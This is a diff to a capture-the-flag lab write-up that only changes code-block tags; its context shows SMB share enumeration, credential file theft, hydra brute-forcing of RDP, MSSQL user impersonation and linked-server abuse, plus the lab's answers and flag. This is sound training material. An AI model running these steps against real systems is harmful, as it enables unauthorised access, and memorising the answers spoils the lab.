@@ -4,7 +4,7 @@ The third server is another internal server used to manage files and working mat
 > Task: What file can you retrieve that belongs to the user "simon"? (Format: filename.txt) **Answer: random.txt**
 
 1. Enumerate the target → found that SMB is enabled
-    ```sh
+    ```shellsession
     $ nmap -sV -Pn -p- 10.129.203.10
     Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-11 04:09 CST
     Nmap scan report for 10.129.203.10
@@ -18,7 +18,7 @@ The third server is another internal server used to manage files and working mat
     ```
 
 2. List available shares:
-    ```sh
+    ```shellsession
     $ smbclient -L //10.129.203.10 -N
 
       Sharename       Type      Comment
@@ -30,7 +30,7 @@ The third server is another internal server used to manage files and working mat
     ```
 
 3. Interact with share `Home` and found the file:
-    ```sh
+    ```shellsession
     $ smbclient //10.129.203.10/Home
     Password for [WORKGROUP\htb-ac-1863259]:
     Try "help" to get a list of possible commands.
@@ -64,7 +64,7 @@ The third server is another internal server used to manage files and working mat
 > Task: Enumerate the target and find a password for the user Fiona. What is her password? **Answer: 48Ns72!bns74@S84NNNSl**
 
 1. Retrieve the `creds.txt` from the `Fiona` folder:
-    ```sh
+    ```shellsession
     $ smbclient //10.129.203.10/Home
     Password for [WORKGROUP\htb-ac-1863259]:
     Try "help" to get a list of possible commands.
@@ -81,7 +81,7 @@ The third server is another internal server used to manage files and working mat
     ```
 
 2. Got list of passwords:
-    ```sh
+    ```shellsession
     $ cat creds.txt 
     Windows Creds
 
@@ -93,7 +93,7 @@ The third server is another internal server used to manage files and working mat
     ```
 
 3. Try to brute-force the RDP service with the found credentials → found 1 valid credential `Fiona:48Ns72!bns74@S84NNNSl`:
-    ```sh
+    ```shellsession
     $ hydra -l Fiona -P creds.txt 10.129.203.10 rdp
     Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -110,7 +110,7 @@ The third server is another internal server used to manage files and working mat
 > Task: Once logged in, what other user can we compromise to gain admin privileges? **Answer: john**
 
 1. Try the found credential `Fiona:48Ns72!bns74@S84NNNSl` to login to the MSSQL service. Then try to impersonate user `john`: 
-    ```sh
+    ```shellsession
     $ mssqlclient.py -p 1433 fiona@10.129.203.10 -windows-auth
     Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -143,7 +143,7 @@ The third server is another internal server used to manage files and working mat
 > Task: Submit the contents of the flag.txt file on the Administrator Desktop. **Answer: HTB{46u\$!n9\_l!nk3d\_\$3rv3r\$}**
 
 1. Interact with other SQL instance using the linked server configuration. Found out that `john` is the sysadmin at that instance → we have file read access:
-    ```sh
+    ```shellsession
     SQL (john  guest@master)> SELECT srvname, isremote FROM sysservers
     srvname                 isremote   
     ---------------------   --------   
